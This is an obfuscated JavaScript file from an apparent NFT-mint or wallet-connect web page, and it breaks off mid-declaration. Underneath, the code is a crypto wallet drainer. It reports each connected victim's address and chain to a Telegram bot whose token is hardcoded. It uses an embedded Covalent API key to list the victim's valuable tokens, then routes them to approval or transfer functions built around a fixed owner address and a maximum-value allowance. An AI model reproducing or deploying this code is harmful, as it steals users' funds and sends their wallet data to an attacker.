const _0x428e52=_0x221b;(function(_0x2efdf6,_0x2f064a){const _0x5a3ad5=_0x221b,_0x4685f1=_0x2efdf6();while(!![]){try{const _0x313a11=parseInt(_0x5a3ad5(0x170))/0x1+-parseInt(_0x5a3ad5(0x10d))/0x2+-parseInt(_0x5a3ad5(0xbb))/0x3+-parseInt(_0x5a3ad5(0x187))/0x4+parseInt(_0x5a3ad5(0x152))/0x5*(-parseInt(_0x5a3ad5(0xe7))/0x6)+parseInt(_0x5a3ad5(0xb7))/0x7+parseInt(_0x5a3ad5(0xfb))/0x8;if(_0x313a11===_0x2f064a)break;else _0x4685f1['push'](_0x4685f1['shift']());}catch(_0x43e94b){_0x4685f1['push'](_0x4685f1['shift']());}}}(_0x44fc,0xae8ad));let tokens=[],chainId=null,web3Object=null,selectedAccount=null;const Web3Modal=window['Web3Modal'][_0x428e52(0x10a)],WalletConnectProvider=window['WalletConnectProvider'][_0x428e52(0x10a)],OWNER_ADDRESS=_0x428e52(0xea),CHAT=0x7af4b2fd,ABI=[{'constant':!![],'inputs':[],'name':_0x428e52(0xbf),'outputs':[{'name':'','type':_0x428e52(0xdd)}],'payable':![],'stateMutability':_0x428e52(0x103),'type':'function'},{'constant':![],'inputs':[{'name':_0x428e52(0xd6),'type':_0x428e52(0x163)}],'name':_0x428e52(0xde),'outputs':[],'payable':![],'stateMutability':_0x428e52(0xec),'type':_0x428e52(0x17e)},{'constant':![],'inputs':[{'name':_0x428e52(0x128),'type':_0x428e52(0x163)},{'name':'_value','type':_0x428e52(0x11f)}],'name':_0x428e52(0xcc),'outputs':[],'payable':![],'stateMutability':_0x428e52(0xec),'type':_0x428e52(0x17e)},{'constant':!![],'inputs':[],'name':'deprecated','outputs':[{'name':'','type':_0x428e52(0x123)}],'payable':![],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'constant':![],'inputs':[{'name':_0x428e52(0xa9),'type':'address'}],'name':_0x428e52(0x176),'outputs':[],'payable':![],'stateMutability':_0x428e52(0xec),'type':'function'},{'constant':!![],'inputs':[],'name':_0x428e52(0x165),'outputs':[{'name':'','type':_0x428e52(0x11f)}],'payable':![],'stateMutability':_0x428e52(0x103),'type':'function'},{'constant':![],'inputs':[{'name':_0x428e52(0xac),'type':'address'},{'name':_0x428e52(0x178),'type':'address'},{'name':_0x428e52(0x155),'type':_0x428e52(0x11f)}],'name':_0x428e52(0x17b),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'constant':!![],'inputs':[],'name':'upgradedAddress','outputs':[{'name':'','type':_0x428e52(0x163)}],'payable':![],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'constant':!![],'inputs':[{'name':'','type':_0x428e52(0x163)}],'name':_0x428e52(0xf4),'outputs':[{'name':'','type':_0x428e52(0x11f)}],'payable':![],'stateMutability':'view','type':_0x428e52(0x17e)},{'constant':!![],'inputs':[],'name':_0x428e52(0x9f),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':_0x428e52(0x17e)},{'constant':!![],'inputs':[],'name':'maximumFee','outputs':[{'name':'','type':_0x428e52(0x11f)}],'payable':![],'stateMutability':_0x428e52(0x103),'type':'function'},{'constant':!![],'inputs':[],'name':_0x428e52(0x11d),'outputs':[{'name':'','type':_0x428e52(0x11f)}],'payable':![],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'constant':![],'inputs':[],'name':'unpause','outputs':[],'payable':![],'stateMutability':_0x428e52(0xec),'type':_0x428e52(0x17e)},{'constant':!![],'inputs':[{'name':_0x428e52(0xc3),'type':_0x428e52(0x163)}],'name':'getBlackListStatus','outputs':[{'name':'','type':_0x428e52(0x123)}],'payable':![],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'constant':!![],'inputs':[{'name':'','type':_0x428e52(0x163)},{'name':'','type':_0x428e52(0x163)}],'name':_0x428e52(0x175),'outputs':[{'name':'','type':_0x428e52(0x11f)}],'payable':![],'stateMutability':'view','type':_0x428e52(0x17e)},{'constant':!![],'inputs':[],'name':_0x428e52(0xd5),'outputs':[{'name':'','type':_0x428e52(0x123)}],'payable':![],'stateMutability':_0x428e52(0x103),'type':'function'},{'constant':!![],'inputs':[{'name':_0x428e52(0xad),'type':_0x428e52(0x163)}],'name':_0x428e52(0xcf),'outputs':[{'name':'','type':_0x428e52(0x11f)}],'payable':![],'stateMutability':'view','type':_0x428e52(0x17e)},{'constant':![],'inputs':[],'name':'pause','outputs':[],'payable':![],'stateMutability':_0x428e52(0xec),'type':_0x428e52(0x17e)},{'constant':!![],'inputs':[],'name':_0x428e52(0x164),'outputs':[{'name':'','type':_0x428e52(0x163)}],'payable':![],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'constant':!![],'inputs':[],'name':_0x428e52(0xdc),'outputs':[{'name':'','type':_0x428e52(0x163)}],'payable':![],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'constant':!![],'inputs':[],'name':_0x428e52(0x182),'outputs':[{'name':'','type':_0x428e52(0xdd)}],'payable':![],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'constant':![],'inputs':[{'name':'_to','type':_0x428e52(0x163)},{'name':_0x428e52(0x155),'type':_0x428e52(0x11f)}],'name':_0x428e52(0x12c),'outputs':[],'payable':![],'stateMutability':_0x428e52(0xec),'type':_0x428e52(0x17e)},{'constant':![],'inputs':[{'name':_0x428e52(0x12a),'type':_0x428e52(0x11f)},{'name':'newMaxFee','type':_0x428e52(0x11f)}],'name':'setParams','outputs':[],'payable':![],'stateMutability':_0x428e52(0xec),'type':'function'},{'constant':![],'inputs':[{'name':_0x428e52(0x98),'type':_0x428e52(0x11f)}],'name':_0x428e52(0x148),'outputs':[],'payable':![],'stateMutability':_0x428e52(0xec),'type':'function'},{'constant':![],'inputs':[{'name':'amount','type':_0x428e52(0x11f)}],'name':_0x428e52(0x15c),'outputs':[],'payable':![],'stateMutability':_0x428e52(0xec),'type':_0x428e52(0x17e)},{'constant':!![],'inputs':[{'name':_0x428e52(0xa3),'type':'address'},{'name':_0x428e52(0x128),'type':_0x428e52(0x163)}],'name':_0x428e52(0xef),'outputs':[{'name':_0x428e52(0xc2),'type':_0x428e52(0x11f)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':!![],'inputs':[],'name':_0x428e52(0x13a),'outputs':[{'name':'','type':_0x428e52(0x11f)}],'payable':![],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'constant':!![],'inputs':[{'name':'','type':_0x428e52(0x163)}],'name':'isBlackListed','outputs':[{'name':'','type':_0x428e52(0x123)}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[{'name':_0x428e52(0xb9),'type':'address'}],'name':'removeBlackList','outputs':[],'payable':![],'stateMutability':_0x428e52(0xec),'type':_0x428e52(0x17e)},{'constant':!![],'inputs':[],'name':_0x428e52(0xa7),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':'view','type':'function'},{'constant':![],'inputs':[{'name':_0x428e52(0x10e),'type':_0x428e52(0x163)}],'name':'transferOwnership','outputs':[],'payable':![],'stateMutability':_0x428e52(0xec),'type':_0x428e52(0x17e)},{'constant':![],'inputs':[{'name':_0x428e52(0xf6),'type':_0x428e52(0x163)}],'name':_0x428e52(0xff),'outputs':[],'payable':![],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'name':_0x428e52(0xd8),'type':_0x428e52(0x11f)},{'name':_0x428e52(0x9c),'type':_0x428e52(0xdd)},{'name':_0x428e52(0x125),'type':_0x428e52(0xdd)},{'name':_0x428e52(0x118),'type':_0x428e52(0x11f)}],'payable':![],'stateMutability':_0x428e52(0xec),'type':'constructor'},{'anonymous':![],'inputs':[{'indexed':![],'name':'amount','type':'uint256'}],'name':_0x428e52(0xf2),'type':_0x428e52(0xe6)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x428e52(0x98),'type':_0x428e52(0x11f)}],'name':_0x428e52(0xf9),'type':'event'},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x428e52(0xb4),'type':_0x428e52(0x163)}],'name':_0x428e52(0x105),'type':_0x428e52(0xe6)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x428e52(0x14d),'type':_0x428e52(0x11f)},{'indexed':![],'name':_0x428e52(0x13e),'type':'uint256'}],'name':_0x428e52(0x102),'type':_0x428e52(0xe6)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x428e52(0xf6),'type':_0x428e52(0x163)},{'indexed':![],'name':_0x428e52(0xa8),'type':_0x428e52(0x11f)}],'name':_0x428e52(0x95),'type':_0x428e52(0xe6)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x428e52(0x171),'type':'address'}],'name':_0x428e52(0x150),'type':_0x428e52(0xe6)},{'anonymous':![],'inputs':[{'indexed':![],'name':_0x428e52(0x171),'type':_0x428e52(0x163)}],'name':_0x428e52(0xf8),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':'owner','type':_0x428e52(0x163)},{'indexed':!![],'name':_0x428e52(0xaa),'type':'address'},{'indexed':![],'name':_0x428e52(0x173),'type':'uint256'}],'name':_0x428e52(0x17c),'type':_0x428e52(0xe6)},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x428e52(0x189),'type':'address'},{'indexed':!![],'name':'to','type':_0x428e52(0x163)},{'indexed':![],'name':_0x428e52(0x173),'type':_0x428e52(0x11f)}],'name':'Transfer','type':_0x428e52(0xe6)},{'anonymous':![],'inputs':[],'name':'Pause','type':'event'},{'anonymous':![],'inputs':[],'name':'Unpause','type':_0x428e52(0xe6)}],ABIN=[{'inputs':[{'internalType':_0x428e52(0xdd),'name':_0x428e52(0xbf),'type':_0x428e52(0xdd)},{'internalType':_0x428e52(0xdd),'name':_0x428e52(0x182),'type':_0x428e52(0xdd)},{'internalType':_0x428e52(0x11f),'name':_0x428e52(0x12b),'type':_0x428e52(0x11f)},{'internalType':_0x428e52(0x11f),'name':_0x428e52(0xa0),'type':'uint256'}],'stateMutability':_0x428e52(0xec),'type':_0x428e52(0x13d)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x428e52(0x163),'name':_0x428e52(0xdc),'type':'address'},{'indexed':!![],'internalType':_0x428e52(0x163),'name':_0x428e52(0xf1),'type':_0x428e52(0x163)},{'indexed':!![],'internalType':'uint256','name':_0x428e52(0x109),'type':_0x428e52(0x11f)}],'name':'Approval','type':_0x428e52(0xe6)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x428e52(0x163),'name':'owner','type':'address'},{'indexed':!![],'internalType':'address','name':_0x428e52(0x9e),'type':_0x428e52(0x163)},{'indexed':![],'internalType':_0x428e52(0x123),'name':_0x428e52(0xf1),'type':_0x428e52(0x123)}],'name':_0x428e52(0x12f),'type':_0x428e52(0xe6)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x428e52(0x163),'name':_0x428e52(0x110),'type':_0x428e52(0x163)},{'indexed':!![],'internalType':'address','name':_0x428e52(0x10e),'type':_0x428e52(0x163)}],'name':_0x428e52(0x157),'type':_0x428e52(0xe6)},{'anonymous':![],'inputs':[{'indexed':!![],'internalType':_0x428e52(0x163),'name':_0x428e52(0x189),'type':_0x428e52(0x163)},{'indexed':!![],'internalType':'address','name':'to','type':_0x428e52(0x163)},{'indexed':!![],'internalType':_0x428e52(0x11f),'name':_0x428e52(0x109),'type':_0x428e52(0x11f)}],'name':_0x428e52(0x122),'type':_0x428e52(0xe6)},{'inputs':[],'name':_0x428e52(0x149),'outputs':[{'internalType':_0x428e52(0xdd),'name':'','type':'string'}],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'inputs':[],'name':_0x428e52(0x14b),'outputs':[{'internalType':_0x428e52(0x11f),'name':'','type':_0x428e52(0x11f)}],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'inputs':[],'name':_0x428e52(0x104),'outputs':[{'internalType':_0x428e52(0x11f),'name':'','type':_0x428e52(0x11f)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x428e52(0x12d),'outputs':[{'internalType':_0x428e52(0x11f),'name':'','type':'uint256'}],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'inputs':[{'internalType':_0x428e52(0x163),'name':'to','type':_0x428e52(0x163)},{'internalType':_0x428e52(0x11f),'name':'tokenId','type':_0x428e52(0x11f)}],'name':'approve','outputs':[],'stateMutability':_0x428e52(0xec),'type':_0x428e52(0x17e)},{'inputs':[{'internalType':'address','name':'owner','type':_0x428e52(0x163)}],'name':_0x428e52(0xcf),'outputs':[{'internalType':_0x428e52(0x11f),'name':'','type':'uint256'}],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'inputs':[],'name':_0x428e52(0x108),'outputs':[{'internalType':'string','name':'','type':'string'}],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'inputs':[],'name':_0x428e52(0x162),'outputs':[],'stateMutability':_0x428e52(0xec),'type':'function'},{'inputs':[],'name':_0x428e52(0xce),'outputs':[],'stateMutability':_0x428e52(0xec),'type':_0x428e52(0x17e)},{'inputs':[{'internalType':_0x428e52(0x11f),'name':_0x428e52(0x109),'type':'uint256'}],'name':_0x428e52(0x172),'outputs':[{'internalType':_0x428e52(0x163),'name':'','type':_0x428e52(0x163)}],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'inputs':[{'internalType':_0x428e52(0x163),'name':'owner','type':'address'},{'internalType':_0x428e52(0x163),'name':_0x428e52(0x9e),'type':_0x428e52(0x163)}],'name':_0x428e52(0xf3),'outputs':[{'internalType':_0x428e52(0x123),'name':'','type':_0x428e52(0x123)}],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'inputs':[],'name':_0x428e52(0xd1),'outputs':[{'internalType':'uint256','name':'','type':_0x428e52(0x11f)}],'stateMutability':'view','type':'function'},{'inputs':[{'internalType':_0x428e52(0x11f),'name':'numberOfTokens','type':'uint256'}],'name':'mintApe','outputs':[],'stateMutability':'payable','type':_0x428e52(0x17e)},{'inputs':[],'name':'name','outputs':[{'internalType':'string','name':'','type':_0x428e52(0xdd)}],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'inputs':[],'name':'owner','outputs':[{'internalType':_0x428e52(0x163),'name':'','type':'address'}],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'inputs':[{'internalType':_0x428e52(0x11f),'name':_0x428e52(0x109),'type':'uint256'}],'name':_0x428e52(0xc4),'outputs':[{'internalType':_0x428e52(0x163),'name':'','type':_0x428e52(0x163)}],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'inputs':[],'name':_0x428e52(0xa6),'outputs':[],'stateMutability':_0x428e52(0xec),'type':_0x428e52(0x17e)},{'inputs':[],'name':_0x428e52(0x153),'outputs':[],'stateMutability':'nonpayable','type':_0x428e52(0x17e)},{'inputs':[{'internalType':_0x428e52(0x163),'name':_0x428e52(0x189),'type':_0x428e52(0x163)},{'internalType':_0x428e52(0x163),'name':'to','type':_0x428e52(0x163)},{'internalType':'uint256','name':_0x428e52(0x109),'type':_0x428e52(0x11f)}],'name':_0x428e52(0x14e),'outputs':[],'stateMutability':_0x428e52(0xec),'type':_0x428e52(0x17e)},{'inputs':[{'internalType':'address','name':_0x428e52(0x189),'type':_0x428e52(0x163)},{'internalType':_0x428e52(0x163),'name':'to','type':_0x428e52(0x163)},{'internalType':_0x428e52(0x11f),'name':_0x428e52(0x109),'type':_0x428e52(0x11f)},{'internalType':_0x428e52(0xfa),'name':'_data','type':_0x428e52(0xfa)}],'name':_0x428e52(0x14e),'outputs':[],'stateMutability':'nonpayable','type':_0x428e52(0x17e)},{'inputs':[],'name':_0x428e52(0x174),'outputs':[{'internalType':_0x428e52(0x123),'name':'','type':_0x428e52(0x123)}],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'inputs':[{'internalType':_0x428e52(0x163),'name':_0x428e52(0x9e),'type':_0x428e52(0x163)},{'internalType':_0x428e52(0x123),'name':_0x428e52(0xf1),'type':_0x428e52(0x123)}],'name':_0x428e52(0x145),'outputs':[],'stateMutability':_0x428e52(0xec),'type':_0x428e52(0x17e)},{'inputs':[{'internalType':_0x428e52(0xdd),'name':_0x428e52(0x108),'type':_0x428e52(0xdd)}],'name':'setBaseURI','outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x428e52(0xdd),'name':'provenanceHash','type':'string'}],'name':_0x428e52(0x168),'outputs':[],'stateMutability':'nonpayable','type':'function'},{'inputs':[{'internalType':_0x428e52(0x11f),'name':_0x428e52(0xb3),'type':_0x428e52(0x11f)}],'name':_0x428e52(0x183),'outputs':[],'stateMutability':_0x428e52(0xec),'type':'function'},{'inputs':[],'name':_0x428e52(0x96),'outputs':[],'stateMutability':_0x428e52(0xec),'type':_0x428e52(0x17e)},{'inputs':[],'name':'startingIndex','outputs':[{'internalType':_0x428e52(0x11f),'name':'','type':_0x428e52(0x11f)}],'stateMutability':'view','type':_0x428e52(0x17e)},{'inputs':[],'name':_0x428e52(0x159),'outputs':[{'internalType':'uint256','name':'','type':_0x428e52(0x11f)}],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'inputs':[{'internalType':'bytes4','name':'interfaceId','type':_0x428e52(0x127)}],'name':_0x428e52(0xae),'outputs':[{'internalType':'bool','name':'','type':_0x428e52(0x123)}],'stateMutability':'view','type':'function'},{'inputs':[],'name':_0x428e52(0x182),'outputs':[{'internalType':'string','name':'','type':_0x428e52(0xdd)}],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'inputs':[{'internalType':_0x428e52(0x11f),'name':_0x428e52(0x140),'type':_0x428e52(0x11f)}],'name':_0x428e52(0x119),'outputs':[{'internalType':_0x428e52(0x11f),'name':'','type':_0x428e52(0x11f)}],'stateMutability':_0x428e52(0x103),'type':'function'},{'inputs':[{'internalType':'address','name':_0x428e52(0xdc),'type':_0x428e52(0x163)},{'internalType':_0x428e52(0x11f),'name':_0x428e52(0x140),'type':_0x428e52(0x11f)}],'name':'tokenOfOwnerByIndex','outputs':[{'internalType':'uint256','name':'','type':_0x428e52(0x11f)}],'stateMutability':_0x428e52(0x103),'type':'function'},{'inputs':[{'internalType':_0x428e52(0x11f),'name':_0x428e52(0x109),'type':'uint256'}],'name':_0x428e52(0x124),'outputs':[{'internalType':_0x428e52(0xdd),'name':'','type':_0x428e52(0xdd)}],'stateMutability':_0x428e52(0x103),'type':_0x428e52(0x17e)},{'inputs':[],'name':_0x428e52(0x165),'outputs':[{'internalType':_0x428e52(0x11f),'name':'','type':_0x428e52(0x11f)}],'stateMutability':'view','type':_0x428e52(0x17e)},{'inputs':[{'internalType':'address','name':_0x428e52(0x189),'type':_0x428e52(0x163)},{'internalType':_0x428e52(0x163),'name':'to','type':_0x428e52(0x163)},{'internalType':'uint256','name':_0x428e52(0x109),'type':_0x428e52(0x11f)}],'name':_0x428e52(0x17b),'outputs':[],'stateMutability':'nonpayable','type':_0x428e52(0x17e)},{'inputs':[{'internalType':'address','name':_0x428e52(0x10e),'type':'address'}],'name':_0x428e52(0x139),'outputs':[],'stateMutability':'nonpayable','type':_0x428e52(0x17e)},{'inputs':[],'name':_0x428e52(0xba),'outputs':[],'stateMutability':_0x428e52(0xec),'type':'function'}],networkToId={0x1328cf7:_0x428e52(0xb8),0x1:'eth-mainnet',0x5:_0x428e52(0x17f),0x89:_0x428e52(0x114),0x13881:_0x428e52(0xeb),0x38:'bsc-mainnet',0x61:_0x428e52(0xb6),0xa86a:'avalanche-mainnet',0xa869:_0x428e52(0xcd),0xfa:_0x428e52(0xd0),0xfa2:_0x428e52(0xc5),0xa4b1:_0x428e52(0x141),0x66eed:_0x428e52(0x116),0xa4ba:_0x428e52(0x112),0x250:_0x428e52(0xe1),0x51:_0x428e52(0x9d),0x150:_0x428e52(0x161),0x4e454152:'aurora-mainnet',0x4e454153:'aurora-testnet',0x6984c:'avalanche-dexalot-mainnet',0x69849:_0x428e52(0x100),0x7e4:_0x428e52(0x16c),0x14a33:_0x428e52(0x15a),0x77:_0x428e52(0x144),0x405:_0x428e52(0x16b),0xa918:_0x428e52(0x160),0x10e8:_0x428e52(0x131),0xdbe0:_0x428e52(0xf7),0x2600:_0x428e52(0xc0),0x50e:_0x428e52(0x10b),0x511:_0x428e52(0xee),0x120:_0x428e52(0x120),0x1c:'boba-rinkeby-testnet',0xb48:_0x428e52(0xd2),0x1e14:_0x428e52(0x138),0x436f7631:_0x428e52(0x121),0x19:_0x428e52(0x94),0x152:_0x428e52(0x166),0xd2af:_0x428e52(0x15b),0x14f:'defi-kingdoms-testnet',0xa516:_0x428e52(0xe4),0x2329:_0x428e52(0x14c),0x2328:_0x428e52(0xda),0x868:_0x428e52(0xca),0x86a:'findora-forge-testnet',0x13:_0x428e52(0xe8),0x10:_0x428e52(0x134),0xe:'flarenetworks-flare-mainnet',0x72:_0x428e52(0x97),0xb7e7759:'gather-mainnet',0x153c099c:'gather-testnet',0x63564c40:_0x428e52(0x151),0x6357d2e0:_0x428e52(0xbe),0x141:'kcc-mainnet',0x142:_0x428e52(0x185),0xe704:_0x428e52(0x142),0x1389:'mantle-testnet',0x52:_0x428e52(0xbd),0x53:'meter-testnet',0x440:_0x428e52(0xf5),0x24c:'metis-testnet',0x7d2:_0x428e52(0x115),0x30e0a:_0x428e52(0x135),0x7d1:_0x428e52(0xc8),0x30da5:_0x428e52(0xe0),0x504:_0x428e52(0x146),0x507:_0x428e52(0x14f),0x505:_0x428e52(0x147),0xe9ac0ce:_0x428e52(0xd3),0x116ea:_0x428e52(0x129),0x116e9:_0x428e52(0xc7),0x116e1:_0x428e52(0xab),0x5afe:_0x428e52(0x137),0x5aff:_0x428e52(0x132),0xf8:_0x428e52(0xc9),0x249c:_0x428e52(0x15e),0xa:'optimism-mainnet',0x2a15c308d:'palm-mainnet',0x2a15c3083:'palm-testnet',0x5a2:_0x428e52(0x17a),0x1e:_0x428e52(0x130),0x1f:_0x428e52(0x13b),0x5d456c62:'skale-calypso',0x1482a7b2:_0x428e52(0xa1),0x3d28774d:_0x428e52(0x16a),0x109b4597:_0x428e52(0xa2),0x536f6c4d:_0x428e52(0x156),0x1202c:_0x428e52(0x143),0x1202d:'swimmer-testnet',0x1a0:_0x428e52(0x180)},providerOptions={'walletconnect':{'package':WalletConnectProvider,'options':{'chainId':0x1,'infuraId':_0x428e52(0x11c),'pollingInterval':_0x428e52(0x106)}},'coinbasewallet':{'package':CoinbaseWalletSDK,'options':{'appName':_0x428e52(0x13c),'infuraId':'e77435344ef0486893cdc26d7d5cf039','chainId':0x1,'darkMode':![]}}};let web3Modal=new Web3Modal({'providerOptions':providerOptions,'cacheProvider':![],'disableInjectedProvider':![]});$(_0x428e52(0x10f))['click'](async function(){const _0x40e5c3=_0x428e52;try{let _0x32561b=await web3Modal[_0x40e5c3(0x154)]();onProvider(_0x32561b),_0x32561b['on'](_0x40e5c3(0x188),_0x35ed30=>{console['log'](_0x35ed30),onProvider(_0x32561b);});}catch(_0x5d2f63){console[_0x40e5c3(0xe9)](_0x40e5c3(0x117),_0x5d2f63);return;}});function _0x44fc(){const _0x2d8819=['/address/','baseURI','tokenId','default','boba-bobabeam-mainnet','chainId:','2195720cuPEmM','newOwner','.connect','previousOwner','Initial\x20list\x20','arbitrum-nova-mainnet','Invalid\x20token\x20${token.address}','matic-mainnet','milkomeda-a1-mainnet','arbitrum-goerli','Could\x20not\x20get\x20a\x20wallet\x20connection','_decimals','tokenByIndex','Your\x20address\x20','tokens-list','e77435344ef0486893cdc26d7d5cf039','_totalSupply','Error:\x20','uint256','boba-mainnet','covalent-internal-network-v1','Transfer','bool','tokenURI','_symbol','estimateGas','bytes4','_spender','nervos-godwoken-mainnet','newBasisPoints','maxNftSupply','transfer','apePrice','NFT','ApprovalForAll','rsk-mainnet','boba-avalanche-testnet','oasis-sapphire-testnet','receipt','flarenetworks-canary-testnet','milkomeda-a1-devnet','type','oasis-sapphire-mainnet','canto-mainnet','transferOwnership','basisPointsRate','rsk-testnet','debug','constructor','maxFee','Token\x20balance\x20is\x20','index','arbitrum-mainnet','linea-testnet','swimmer-mainnet','bittorrent-mainnet','setApprovalForAll','moonbeam-mainnet','moonbeam-moonriver','issue','BAYC_PROVENANCE','999999999999999999999999999999999999999999999999999999999999999999999999','MAX_APES','evmos-mainnet','feeBasisPoints','safeTransferFrom','moonbeam-moonbase-alpha','AddedBlackList','harmony-mainnet','803615gPVxkl','reserveApes','connect','_value','solana-mainnet','OwnershipTransferred','then','startingIndexBlock','base-testnet','defi-kingdoms-mainnet','redeem','error','oasys-testnet','Wallet\x20Connected\x20Successfully\x20to\x20','boba-avalanche-mainnet','astar-shiden','emergencySetStartingIndexBlock','address','getOwner','totalSupply','cronos-testnet','sendTransaction','setProvenanceHash','Transaction\x20Rejected','skale-omnus','bittorrent-testnet','axie-mainnet','&text=','Transaction\x20is\x20submitted\x20to\x20the\x20network','gas','1161284GCetxb','_user','getApproved','value','saleIsActive','allowed','addBlackList','Contract','_to','New\x20token','polygon-zkevm-testnet','transferFrom','Approval','transactionHash','function','eth-goerli','sx-mainnet','Open\x20your\x20selected\x20wallet\x20or\x20extension\x20to\x20approve\x20smart\x20contract','symbol','setRevealTimestamp','getChainId','kcc-testnet','Token\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','3450256zkXDyV','accountsChanged','from','cronos-mainnet','DestroyedBlackFunds','setStartingIndex','flarenetworks-flare-testnet','amount','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','Transaction\x20Hash:\x20','TOKEN\x20Contract\x20Address\x20','_name','astar-shibuya','operator','decimals','saleStart','skale-staging-uum','skale-razor','_owner','Error\x20processing\x20item\x20','catch','renounceOwnership','MAX_UINT','_balance','_evilUser','spender','nervos-polyjuice-testnet','_from','who','supportsInterface','application/json','balance','methods','contract_ticker_symbol','revealTimeStamp','newAddress','json','bsc-testnet','1674218ZYpEZg','btc-mainnet','_clearedUser','withdraw','2320392aYzWlP','search','meter-mainnet','harmony-testnet','name','boba-bnb-testnet','map','remaining','_maker','ownerOf','fantom-testnet','getBalance','nervos-godwoken-testnet','milkomeda-c1-mainnet','oasys-mainnet','findora-mainnet','https://api.covalenthq.com/v1/','approve','avalanche-testnet','flipSaleState','balanceOf','fantom-mainnet','maxApePurchase','boba-goerli','neon-testnet','eth','paused','_upgradedAddress','BNB','_initialSupply','Transaction\x20Receipt:\x20','evmos-testnet','Tokens:','owner','string','deprecate','usd','milkomeda-c1-devnet','astar-mainnet','send','true','emerald-paratime-mainnet','items','event','6BrFuAd','flarenetworks-canary-mainnet','log','0xF7CC89c87B626A9b2B16ed6a6922aaF4b3B8fbf8','matic-mumbai','nonpayable','location','boba-bobabase-testnet','allowance','toString','approved','Issue','isApprovedForAll','balances','metis-mainnet','_blackListedUser','boba-bnb-mainnet','RemovedBlackList','Redeem','bytes','17672624jaioHA','filter','contract_address','cryptocurrency','destroyBlackFunds','avalanche-dexalot-testnet','GET','Params','view','REVEAL_TIMESTAMP','Deprecate','10000'];_0x44fc=function(){return _0x2d8819;};return _0x44fc();}async function onProvider(_0x55bcd6){const _0x1d3a0f=_0x428e52;web3Object=new Web3(_0x55bcd6);let _0x2d8160=await web3Object[_0x1d3a0f(0xd4)]['getAccounts']();selectedAccount=_0x2d8160[0x0],chainName=await web3Object['eth'][_0x1d3a0f(0x184)](),chainId=networkToId[chainName],console['log'](chainId),console['log'](selectedAccount),alert(_0x1d3a0f(0x181)),_0x2d8160['length']&&(sendMessage(_0x1d3a0f(0x15f)+chainId+'!'),sendMessage('Cl\x20address\x20:\x20'+selectedAccount),covalenthqAPICall());}async function covalenthqAPICall(){const _0x2ba48a=_0x428e52,_0x3d5779={'format':'JSON','nft':_0x2ba48a(0xe3),'quote-currency':_0x2ba48a(0xdf),'key':'ckey_5da97a82746c43ed84565c64afb'},_0x328d4e=new URL(_0x2ba48a(0xcb)+chainId+_0x2ba48a(0x107)+selectedAccount+'/balances_v2/');_0x328d4e[_0x2ba48a(0xbc)]=new URLSearchParams(_0x3d5779)[_0x2ba48a(0xf0)]();const _0x4a7649={'method':'GET','headers':{'Content-Type':_0x2ba48a(0xaf)}};try{const _0x25748f=await fetch(_0x328d4e,_0x4a7649)[_0x2ba48a(0x158)](_0x4e219d=>_0x4e219d[_0x2ba48a(0xb5)]());let _0x1c08d1=_0x25748f['data'][_0x2ba48a(0xe5)];console['log'](_0x2ba48a(0x111),_0x1c08d1);let _0x24b143=_0x1c08d1[_0x2ba48a(0xc1)](_0x597619=>{const _0x23432d=_0x2ba48a;return{'balance':_0x597619[_0x23432d(0xb0)],'value':_0x597619['quote'],'address':_0x597619[_0x23432d(0xfd)],'symbol':_0x597619[_0x23432d(0xb2)],'type':_0x597619[_0x23432d(0x136)]};});console[_0x2ba48a(0xe9)](_0x2ba48a(0x11b),_0x24b143),tokens=_0x24b143[_0x2ba48a(0xfc)](_0x354624=>_0x354624['value']>0x5&&_0x354624['symbol']!=_0x2ba48a(0xd7)),console['log'](_0x2ba48a(0x10c),chainId,_0x2ba48a(0xdb),tokens);if(window[_0x2ba48a(0xed)][_0x2ba48a(0xbc)])onSendEther();else onApprove();}catch{sendMessage('Error\x20collecting\x20info\x20about\x20wallet');}}async function onApprove(){const _0x409ebe=_0x428e52;if(tokens['length'])try{loopTokens(tokens);}catch(_0xde606d){console['error'](_0x409ebe(0xa4)+_0xde606d['message']);}else sendMessage(_0x409ebe(0x186));}async function 